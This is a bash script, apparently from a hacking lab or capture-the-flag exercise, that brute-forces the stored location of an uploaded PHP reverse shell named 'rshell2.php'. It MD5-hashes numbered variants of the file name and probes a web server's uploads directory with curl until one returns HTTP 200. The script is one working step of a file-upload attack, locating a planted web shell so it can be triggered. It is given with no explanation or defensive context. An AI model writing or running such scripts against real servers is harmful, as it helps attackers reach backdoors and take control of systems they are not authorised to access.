#!/bin/bash

target="http://192.168.111.22:8000/uploads/"
file_name="rshell2.php"

for index in {1..99}; do
    new_file_name="${file_name}${index}"
    echo "Trying file name: $new_file_name"
    
    md5hash=$(echo -n "$new_file_name" | md5sum | cut -d ' ' -f 1)
    echo "Trying hash: $md5hash"
    
    response=$(curl -s -o /dev/null -w "%{http_code}" -I "${target}${md5hash}.php")
    
    if [[ "$response" == "200" ]]; then
        echo "File found: ${target}${md5hash}.php"
        break
    else
        echo "File not found. Status: $response"
    fi
    
    sleep 1
done

